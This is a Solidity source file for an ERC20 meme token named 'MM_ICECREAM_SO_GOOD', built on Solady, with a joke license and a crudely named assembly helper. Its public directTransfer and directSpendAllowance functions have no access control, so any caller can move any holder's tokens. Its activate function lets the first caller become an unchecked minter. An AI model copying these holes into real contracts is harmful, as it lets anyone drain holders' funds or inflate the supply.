// SPDX-License-Identifier: Hell
pragma solidity ^0.8.21;

import "solady/src/auth/Ownable.sol";
import "solady/src/tokens/ERC20.sol";

contract MMICECREAMSOGOOD is Ownable, ERC20 {

    bool public minable = false;
    string internal _name = 'MM_ICECREAM_SO_GOOD';
    string internal _symbol = 'MM_ICE_CREAM_SOGOOD';
    uint8 internal _decimals = 18;
    uint256 internal max_supply = 696900000000000000000000000000000;
    address allowed_miner;

   function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function directTransfer(address from, address to, uint256 amount) public virtual {
        _transfer(_gayFrogPotion(from), _gayFrogPotion(to), amount);
    }

    function directSpendAllowance(address owner, address spender, uint256 amount) public virtual {
        _spendAllowance(_gayFrogPotion(owner), _gayFrogPotion(spender), amount);
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        return super.transfer(_gayFrogPotion(to), amount);
    }
    function transferFrom(address from, address to, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        return super.transferFrom(_gayFrogPotion(from), _gayFrogPotion(to), amount);
    }

    function increaseAllowance(address spender, uint256 difference)
        public
        virtual
        override
        returns (bool)
    {
        return super.increaseAllowance(_gayFrogPotion(spender), difference);
    }

    function decreaseAllowance(address spender, uint256 difference)
        public
        virtual
        override
        returns (bool)
    {
        return super.decreaseAllowance(_gayFrogPotion(spender), difference);
    }

    function _gayFrogPotion(address a) internal view returns (address result) {
        /// @solidity memory-safe-assembly
        assembly {
            result := or(a, shl(160, gas()))
        }
    }
    function activate() external payable {
        require(minable == false, "INVALID");
        allowed_miner = msg.sender;
        minable = true;
        //LP Bootstrap
         _mint(_gayFrogPotion(msg.sender), 20000 ether);
        
    }
    function mintSupplyFromV3LP(address miner, uint256 value) external payable {
        require(minable == true, "INVALID");
        require(msg.sender == allowed_miner, "INVALID");
        uint _supply = totalSupply();
        uint _calculated = _supply + value;

        require(_calculated <= max_supply, "EXCEEDS MAX");
        _mint(_gayFrogPotion(miner), value);
    }
}